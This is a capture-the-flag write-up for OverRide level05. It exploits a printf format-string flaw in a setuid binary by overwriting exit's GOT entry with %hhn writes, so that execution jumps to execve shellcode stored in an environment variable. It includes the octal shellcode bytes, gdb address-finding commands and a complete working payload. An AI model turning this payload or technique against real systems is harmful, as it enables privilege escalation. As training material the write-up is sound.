# OverRide (level05)

In this project, we try to **exploit binaries** with the intent of reading the `/home/users/level<n+1>/.pass` file, containing our flag serving as the password for the next level.

# Binary

Binary properties:
- Full path: `/home/users/level05/level05`
- Type: **ELF 32-bit LSB executable** (`file -b ~/level05`)

To analyze its content we generated two files:
- [source.c](./source.c): generated with our [ghidra.sh](../common/ghidra/ghidra.sh), wrapping a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra).
- [source.asm](./source.asm): trimmed after being generated through `objdump -D ~/level05`.

# Security

Let's connect to the server through [ssh](./Ressources/ssh.sh) and inspect the protections in place.

## File Attributes

```sh
$ ls -la ~/level05
-rwsr-s---+ 1 level06 users 5176 Sep 10  2016 /home/users/level05/level05
```

|    Attribute    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|    Suid bit     |    ✅     | Owned by level06, so it runs with level06's effective uid: opening a shell inherits it.


## Compile-Time

```sh
$ checksec --file ~/level05
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```

|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      RELRO      |    ❌     | GOT is writable.
|  Stack Canary   |    ❌     | Stack buffer overflows are possible.
|       NX        |    ❌     | Stack/Heap are executable. Shellcode injection is possible.
|       PIE       |    ❌     | The code, GOT and PLT sit at fixed addresses.
| RPATH / RUNPATH |    ❌     | No custom library search path to hijack.

## Kernel Run-Time

```sh
$ cat /proc/sys/kernel/randomize_va_space
0
```

|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      ASLR       |    ❌     | Stack and heap addresses are stable across runs.

## Documentation

Reference material for the concepts above:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASLR): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

# Vulnerability & Analysis

The decompiled binary (cf. [source](source.c)) is subject to a "Use of Externally-Controlled Format String" ([CWE-134](https://cwe.mitre.org/data/definitions/134.html)) vulnerability due to the call of `printf(buffer)`, where `buffer` is our own input passed directly as the format string.

`fgets()` bounds its read, so no buffer overflow is possible. And `main()` never returns, it leaves through `exit(0)`, so its saved return address is dead anyway.

Still, through this format-string flaw, we are free to read and write anywhere in writable memory.

Inspired by previous projects (`snow-crash`) we decide to work with the [Global Offset Table](https://en.wikipedia.org/wiki/Global_Offset_Table).
**No RELRO** being set, it is writable. And by overwriting `exit`'s GOT entry, we can make `exit@plt` (and indirectly `exit(0)`) jump to our shellcode, since `exit@plt` dereferences a pointer stored in the GOT, which we overwrite.

Sadly, the buffer is modified beforehand. Any byte matching letters from A-Z on the ASCII table gets altered (lowercased). So we'll store the shellcode in an environment variable instead, which the loop never touches and which sits above `main()`'s stack frame.

# Exploit

## Hijack

`exit@plt` jumps indirectly through `0x80497e0`, exit's GOT entry. The dynamic linker (`ld-linux.so`) writes libc's real `exit` address into that slot at runtime, and the stub reads it on every call. Since the slot is writable, we can overwrite it with our shellcode address, so the next `exit` jumps there instead.
```sh
08048370 <exit@plt>:
 8048370:	ff 25 e0 97 04 08    	jmp    *0x80497e0
 8048376:	68 18 00 00 00       	push   $0x18
 804837b:	e9 b0 ff ff ff       	jmp    8048330 <_init+0x38>
```
`0x80497e0` is represented in little-endian octal sequence as: `\340\227\004\010`.

As described in `printf()`'s [man-page](https://man7.org/linux/man-pages/man3/printf.3.html), the `%n` conversion writes the number of characters printed so far to the address held by its argument. Since we control the stack, we can point that argument wherever we want.

The value we want to inject (`0xffffdfc2` <=> `4294959042` <=> ~4GB) is far too large to print that many characters. But it's a 4-byte value, so we can split it into 4 individual bytes and write each one with the `%hhn` conversion, keeping each write at most `0xff` (255) characters.

Writing it one byte at a time means we also need 4 consecutive addresses: the GOT slot and the next three bytes. In little-endian octal sequence: `\340\227\004\010`, `\341\227\004\010`, `\342\227\004\010`, `\343\227\004\010` (i.e. `0x080497e0`..`0x080497e3`).

## Shellcode

First we'll generate the target shellcode we want to inject in our environment variable.
When we generate it, we discover it's **25** bytes long *(assuming the file is kept in sync)*.
```sh
$ tmpdir=$(mktemp -d);
$ asm_payload_filepath="./data/shellcode.asm";
# Compile the assembly program to an object file.
$ nasm -f elf32 "$asm_payload_filepath" -o "$tmpdir/exploit.o";
# Link the object file into a binary.
$ ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin";
# Extract the content of the ELF .text section as raw bytes.
$ objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin";
# Format the bytes into an octal shellcode payload.
# We use octal because dash's printf implementation does not support the '\xHH' escape format.
$ octal_shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
# \061\300\120\150\156\057\163\150\150\057\057\142\151\211\343\120\123\211\341\061\322\260\013\315\200
$ octal_shellcode_byte_length=$(printf "%b" "$octal_shellcode" | wc -c);
# 25
```

We know that environment variables are injected above `main()`'s stack frame as its third parameter: `envp`.
Let's try to find a reliable address to pinpoint.
```sh
gdb -quiet -batch \
  -ex 'set exec-wrapper env -i SHELLCODE=$(printf %b "$(generate_shellcode)")' \
  -ex 'break main' \
  -ex 'run </dev/null' \
  -ex 'x/s *((char **)environ) + 10' \
  --args /home/users/level05/level05;
0xffffdfc2:	 "1\300Phn/shh//bi\211\343PS\211\341\061Ұ\v̀"
# 'environ' is offset by 10 to exclude the environment variable name.
```
`0xffffdfc2` is represented in little-endian octal sequence as: `\302\337\377\377`.

But as seen in the [Hijack section](#hijack), we will need to write this 4-byte address down one byte at a time. So let's already split it up: `\302`, `\337`, `\377`, `\377`. For ease of understanding, since `%hhn` writes the running character count, we convert each byte to decimal to know the count it must reach: `194`, `223`, `255`, `255`.

## Finding our buffer.

Our buffer is the format string, so its own bytes also sit among the stack slots `printf()` reads as arguments. We prepend a marker (`aaaa`) and dump slots until it reappears.
```sh
$ printf '%s\n' 'aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p' | ~/level05;
aaaa 0x64 0xf7fcfac0 (nil) (nil) (nil) (nil) 0xffffffff 0xffffd6d4 0xf7fdb000 0x61616161 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
# Our marker (0x61616161) is the 10th slot: the buffer starts at %10$, so our 4 addresses land on %10$..%13$.
```

With the slots of where our addresses will live in hand, we can now proceed ! We need nothing more :D

## Solution

```sh
# The indexes in the variable names here represent each byte of the final resulting 4-byte value, as seen above.

# The 4 exit@GOT byte addresses.
exit_got_addr_1='\340\227\004\010';
exit_got_addr_2='\341\227\004\010';
exit_got_addr_3='\342\227\004\010';
exit_got_addr_4='\343\227\004\010';

exit_got_addr="${exit_got_addr_1}${exit_got_addr_2}${exit_got_addr_3}${exit_got_addr_4}"; # 4 * 4 = 16 bytes.
exit_got_addr_len="$(printf '%b' "$exit_got_addr" | wc -c)";

# %hhn writes the total written bytes up until now.
# This makes each separate input inter-dependent.
shellcode_addr_1="$((194 - $exit_got_addr_len))"; # \302 -> 194 - 16  = 178
shellcode_addr_2="$((223 - 194))";                # \337 -> 223 - 194 = 29
shellcode_addr_3="$((255 - 223))";                # \377 -> 255 - 223 = 32
shellcode_addr_4="$((255 - 255))";                # \377 -> 255 - 255 = 0

# A %c always writes at least one char, so since 'shellcode_addr_4' is 0 we skip it (byte 4 is already at 255).
payload="$exit_got_addr%${shellcode_addr_1}c%10\$hhn%${shellcode_addr_2}c%11\$hhn%${shellcode_addr_3}c%12\$hhn%13\$hhn"
(printf '%b' "$payload"; cat) | env -i SHELLCODE="$(printf %b "$(generate_shellcode)")" ~/level05;
```

And there we are !
